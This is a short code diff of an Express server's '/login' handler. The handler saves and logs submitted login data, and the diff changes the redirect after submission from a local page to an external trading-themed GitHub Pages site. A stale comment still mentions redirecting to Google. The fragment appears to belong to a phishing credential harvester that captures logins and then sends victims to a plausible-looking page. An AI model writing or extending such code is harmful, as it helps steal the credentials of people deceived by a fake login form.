@@ -31,7 +31,7 @@ app.post('/login', (req, res) => {
         } else {
             console.log('Login data saved:\n', loginData.trim());
             // Redirect to Google.com after submitting the form
-            res.redirect('index.html');
+            res.redirect('https://jasteeeeee.github.io/Fox-bit-KingStone-Traders.github.io/');
         }
     });
 });
